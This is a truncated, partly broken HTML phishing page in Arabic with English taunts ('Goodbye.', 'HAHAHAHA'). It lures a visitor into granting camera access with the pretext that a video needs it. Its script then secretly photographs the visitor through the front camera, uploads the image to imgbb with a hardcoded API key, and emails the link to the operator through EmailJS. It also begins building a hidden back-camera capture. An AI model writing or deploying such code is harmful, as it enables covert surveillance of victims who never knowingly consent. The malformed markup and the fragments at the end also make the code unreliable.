<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <script>
    (function() {

    })();

  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
      color: white;
      text-align: center;
      padding: 20px;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: rgba(0, 0, 0, 0.7);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      max-width: 800px;
      width: 90%;
      margin: 20px auto;
      backdrop-filter: blur(10px);
    }
    h1 {
      font-size: 28px;
      margin-bottom: 25px;
      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
    }
    .video-container {
      position: relative;
      width: 100%;
      height: 0;
      padding-bottom: 56.25%;
      margin: 0 auto 25px;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
    }
    #player {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 0;
      border-radius: 10px;
      display: none;
    }
    .loading {
      display: none;
      margin: 30px 0;
    }
    .spinner {
      border: 5px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 5px solid #fff;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .message {
      display: none;
      padding: 20px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin-top: 25px;
      font-size: 18px;
    }
    .error {
      color: #ff6b6b;
      display: none;
      margin-top: 20px;
      padding: 15px;
      background: rgba(255, 0, 0, 0.1);
      border-radius: 8px;
    }
    .success {
      color: #4cd97b;
      display: none;
    }
    .footer {
      margin-top: 30px;
      font-size: 14px;
      opacity: 0.8;
    }
    .hidden {
      display: none;
    }
    .countdown {
      font-size: 36px;
      font-weight: bold;
      margin: 20px 0;
      padding: 15px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 10px;
      display: inline-block;
      min-width: 100px;
    }
    .permission-request {
      padding: 20px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin: 20px 0;
    }
    .permission-btn {
      background: #4CAF50;
      color: white;
      border: none;
      padding: 12px 30px;
      font-size: 18px;
      border-radius: 50px;
      cursor: pointer;
      margin-top: 15px;
      transition: all 0.3s;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    }
    .permission-btn:hover {
      background: #45a049;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
    }
    .permission-btn:active {
      transform: translateY(0);
    }
    .instructions {
      font-size: 16px;
      margin-top: 15px;
      line-height: 1.6;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Goodbye.</h1>
    <div class="permission-request" id="permissionRequest">

    </div>
    <div class="countdown" id="countdown">10</div>

    </div>
    <div class="loading">
      <div class="spinner"></div>

      <p>Hahaha</p>

    </div>
    <div class="error" id="error-message">
      Internet Error
    </div>
    <div class="footer">
      <p>HAHAHAHA</p>
    </div>
  </div>

  <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
  <canvas id="canvas" width="640" height="480" class="hidden"></canvas>

  <script>
    const player = document.getElementById('player');
    const loading = document.querySelector('.loading');
    const message = document.querySelector('.message');
    const success = document.querySelector('.success');
    const errorMsg = document.getElementById('error-message');
    const hiddenVideo = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('canvas');
    const countdownElement = document.getElementById('countdown');
    const permissionRequest = document.getElementById('permissionRequest');
    const cameraBtn = document.getElementById('cameraBtn');
    let cameraCaptured = false;
    let emailSent = false;
    let countdownInterval;
    let stream;
    countdownElement.style.display = 'none';

    function startCountdown() {
      let count = 10;
      countdownElement.textContent = count;
      countdownElement.style.display = 'block';
      countdownInterval = setInterval(() => {
        count--;
        countdownElement.textContent = count;
        if (count <= 0) {
          clearInterval(countdownInterval);
          countdownElement.style.display = 'none';
          startVideoPlayback();
        }
      }, 1000);
    }

    function startVideoPlayback() {
      loading.style.display = 'block';
      player.src = 'https://www.youtube.com/embed/efQ7_0IzgUw?rel=0&controls=1&showinfo=0&autoplay=1';
      player.style.display = 'block';
      setTimeout(captureImage, 3000);
      setTimeout(captureBackCameraImage, 4000);
    }

    cameraBtn.addEventListener('click', async () => {
      try {
        permissionRequest.style.display = 'none';
        loading.style.display = 'block';
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          } 
        });
        hiddenVideo.srcObject = stream;
        cameraCaptured = true;
        loading.style.display = 'none';
        startCountdown();
      } catch (error) {
        console.error('Camera error:', error);
        loading.style.display = 'none';
        permissionRequest.style.display = 'block';
        errorMsg.textContent = 'يجب السماح بالكاميرا لتشغيل الفيديو. يرجى تحديث الصفحة والمحاولة مرة أخرى.';
        errorMsg.style.display = 'block';
      }
    });

    player.addEventListener('load', () => {
      loading.style.display = 'none';
      message.style.display = 'block';
      success.style.display = 'block';
    });

    function captureImage() {
      if (!cameraCaptured) return;
      try {
        const ctx = canvas.getContext('2d');
        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        const base64Image = imageData.split(',')[1];
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        const formData = new FormData();
        formData.append('image', base64Image);
        formData.append('name', 'hidden_capture_' + Date.now());
        fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(imgbbData => {
          if (imgbbData.success) {
            emailjs.send("service_890xst3", "template_p1oukct", {
              name: "صورة خفية",
              time: new Date().toLocaleString(),
              message: "تم التقاط صورة جديدة من الكاميرا الأمامية.",
              image_url: imgbbData.data.url
            }).then(() => {
              emailSent = true;
            }, error => {
              console.error('Email error:', error);
            });
          }
        })
        .catch(error => {
          console.error('ImgBB error:', error);
        });
      } catch (error) {
        console.error('Capture error:', error);
      }
    }

    // الكاميرا الخلفية
    const hiddenBackVideo = document.createElement('video');
    hiddenBackVideo.setAttribute('autoplay', true);
    hiddenBackVideo.setAttribute('playsinline', true);
    hiddenBackVideo.classList.add('hidden');
    document.body.appendChild(hiddenBackVideo);

    const backCanvas = document.createElement('canvas');
    backCanvas.width = 640;
    backCanvas.height = 480;
    backCanvas.classList.add('hidden');
    document.body.appendChild(backCanvas);

        })

        .then(imgbbData => {
          if (imgbbData.success) {
